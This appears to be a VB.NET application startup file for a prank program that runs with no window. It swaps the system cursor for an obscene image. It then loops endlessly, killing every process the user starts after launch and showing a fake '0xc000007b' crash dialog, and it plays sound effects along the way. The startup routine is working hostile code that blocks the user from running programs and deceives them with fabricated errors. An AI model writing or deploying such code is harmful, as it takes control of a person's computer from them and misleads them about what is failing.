Namespace My

    ' The following events are available for MyApplication:
    ' 
    ' Startup: Raised when the application starts, before the startup form is created.
    ' Shutdown: Raised after all application forms are closed.  This event is not raised if the application terminates abnormally.
    ' UnhandledException: Raised if the application encounters an unhandled exception.
    ' StartupNextInstance: Raised when launching a single-instance application and the application is already active. 
    ' NetworkAvailabilityChanged: Raised when the network connection is connected or disconnected.
    Partial Friend Class MyApplication
        Friend ProcessList As New List(Of Integer)
        Sub MyApplication_Startup(sender As Object, e As ApplicationServices.StartupEventArgs) Handles Me.Startup
            e.Cancel = True
            My.Computer.FileSystem.WriteAllBytes(IO.Path.Combine(My.Computer.FileSystem.SpecialDirectories.Temp,
                                                                 "MyCross.cur"), My.Resources.aero_middle_finger_2, False)
            SavedCursor = Icon.FromHandle(Cursors.Arrow.CopyHandle)

            'Change arrow cursor to mine
            Dim NewCursor As IntPtr = LoadCursorFromFile(IO.Path.Combine(My.Computer.FileSystem.SpecialDirectories.Temp, "MyCross.cur"))

            'Check
            If NewCursor = IntPtr.Zero Then
                'Error loading cursor from file
                Debug.WriteLine("Error loading cursor from file.")
                Return
            End If

            'Set the system cursor
            If SetSystemCursor(NewCursor, IDC_ARROW) = 0 Then
                'Error setting system cursor
                Debug.WriteLine("Error setting system cursor.")
                Return
            End If
            For Each Process As Process In Process.GetProcesses
                ProcessList.Add(Process.Id)
            Next
            Do
                If Now.TimeOfDay < New TimeSpan(11, 15, 0) And Now.TimeOfDay > New TimeSpan(11, 14, 0) Then My.Computer.Audio.Play(
                    My.Resources.JOHN_CENA, AudioPlayMode.WaitToComplete)
                System.Threading.Thread.Sleep(100)
                For Each Process As Process In Process.GetProcesses
                    If Not ProcessList.Contains(Process.Id) Then
                        Try
                            If Process.HasExited Then Continue For
                            Process.Kill()
                            My.Computer.Audio.Play(My.Resources.Nope__Sound_effect____download_link, AudioPlayMode.Background)
                            MsgBox("The application was unable to start correctly (0xc000007b). Click OK to close the application",
                                   MsgBoxStyle.Critical Or MsgBoxStyle.OkOnly Or MsgBoxStyle.SystemModal, Process.ProcessName)
                        Catch ex As System.Exception
                        End Try
                    End If
                Next
            Loop
        End Sub
        'API declarations
        Private Declare Function SetSystemCursor Lib "user32.dll" (ByVal hCursor As IntPtr, ByVal id As Integer) As Boolean
        Private Declare Function LoadCursorFromFile Lib "user32.dll" Alias "LoadCursorFromFileA" (ByVal lpFileName As String) As IntPtr

        'Cursor constants
        Private Const IDC_APPSTARTING As UInt32 = 32650
        Private Const IDC_ARROW As UInt32 = 32512
        Private Const IDC_HAND As UInt32 = 32649
        Private Const IDC_CROSS As UInt32 = 32515
        Private Const IDC_HELP As UInt32 = 32651
        Private Const IDC_IBEAM As UInt32 = 32513
        Private Const IDC_NO As UInt32 = 32648
        Private Const IDC_SIZEALL As UInt32 = 32646
        Private Const IDC_SIZENESW As UInt32 = 32643
        Private Const IDC_SIZENS As UInt32 = 32645
        Private Const IDC_SIZENWSE As UInt32 = 32642
        Private Const IDC_SIZEWE As UInt32 = 32644
        Private Const IDC_UP As UInt32 = 32516
        Private Const IDC_WAIT As UInt32 = 32514

        'Variable to save current cursor
        Dim SavedCursor As Icon
        Sub MyApplication_Shutdown(sender As Object, e As EventArgs) Handles Me.Shutdown
            'Get old cursor
            Dim OldCursor As IntPtr = SavedCursor.Handle

            'Set the system cursor
            SetSystemCursor(OldCursor, IDC_ARROW)
        End Sub
#If False Then
        Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
            'Save cursor
            SavedCursor = Icon.FromHandle(Cursors.Arrow.CopyHandle)

            'Change arrow cursor to mine
            Dim NewCursor As IntPtr = LoadCursorFromFile(Application.StartupPath & "\MyCross.cur")

            'Check
            If NewCursor = IntPtr.Zero Then
                'Error loading cursor from file
                Debug.WriteLine("Error loading cursor from file.")
                Return
            End If

            'Set the system cursor
            If SetSystemCursor(NewCursor, IDC_ARROW) = 0 Then
                'Error setting system cursor
                Debug.WriteLine("Error setting system cursor.")
                Return
            End If

            'Disable/enable buttons
            Button1.Enabled = False
            Button2.Enabled = True
        End Sub

        Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
            'Get old cursor
            Dim OldCursor As IntPtr = SavedCursor.Handle

            'Set the system cursor
            SetSystemCursor(OldCursor, IDC_ARROW)

            'Disable/enable buttons
            Button1.Enabled = True
            Button2.Enabled = False
        End Sub
#End If
    End Class
End Namespace

